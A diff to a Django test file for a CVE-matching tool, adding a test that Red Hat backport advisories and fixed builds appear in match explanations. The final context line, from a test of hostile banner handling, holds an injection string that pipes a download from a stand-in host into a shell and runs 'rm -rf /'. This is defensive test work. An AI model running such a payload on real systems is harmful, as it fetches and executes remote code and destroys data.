@@ -10,7 +10,7 @@ from django.test import TestCase
 from django.utils import timezone
 
 from agentapi.auth import create_token
-from cveFeed import detection, match_explain
+from cveFeed import correlation, detection, match_explain
 from cveFeed.models import CVEEntry, CVEMatch
 from dashboard.models import Org, Project, ProjectMembership
 from django.contrib.auth.models import User
@@ -168,6 +168,29 @@ class MatchExplainTests(Base):
 		match.distro_fixed_version = 'x y'
 		match.save()
 		self.assertNotIn('advisory', self.explain(match))
+
+	def test_the_red_hat_row_that_judged_the_match_names_its_advisory_and_build(self):
+		# cveFeed.correlation.distro_fix_evidence's shape: distro_status "backport", evidence.distro_fix from the Red Hat row
+		sub = self.host()
+		match = self.tech(sub, self.cve('CVE-2024-38476', APACHE), 'Apache HTTP Server', '2.4.37', {'fixed': '2.4.60'},
+						  distro_status='backport', distro_fixed_version='0:2.4.37-65.module+el8.10.0+22069+b47f5c72.1')
+		match.evidence = {**match.evidence, 'distro': {'distro': 'rhel', 'basis': 'host'},
+						  'distro_fix': correlation.distro_fix_evidence(
+							  {'distro': 'rhel', 'package': 'httpd'}, {'release': 'el8', 'package': 'httpd:2.4', 'status': 'fixed', 'advisory': 'RHSA-2024:4720'},
+							  '0:2.4.37-65.module+el8.10.0+22069+b47f5c72.1')}
+		match.save()
+		out = self.explain(match)
+		self.assertEqual(out['basis'], 'distro_backport')
+		self.assertEqual(out['advisory'], {'advisory': 'RHSA-2024:4720', 'url': 'https://access.redhat.com/errata/RHSA-2024:4720',
+										   'fixed_build': 'httpd-2.4.37-65.module+el8.10.0+22069+b47f5c72.1'})
+		# a fixed version with no epoch is recorded as "name version": shown as the build name
+		match.evidence['distro_fix']['fixed_build'] = 'httpd 2.4.37-66.el8'
+		match.save()
+		self.assertEqual(self.explain(match)['advisory']['fixed_build'], 'httpd-2.4.37-66.el8')
+		# another distribution's row is never read as Red Hat's
+		match.evidence['distro_fix'] = {'source': 'ubuntu', 'advisory': 'RHSA-2024:9999', 'fixed_build': 'apache2-2.4.41'}
+		match.save()
+		self.assertNotEqual(self.explain(match).get('advisory', {}).get('advisory'), 'RHSA-2024:9999')
 
 	def test_a_hostile_banner_never_reaches_a_command(self):
 		evil = "$(curl -s http://evil.example/x|sh) `id` ; rm -rf / Red Hat \"' && reboot"
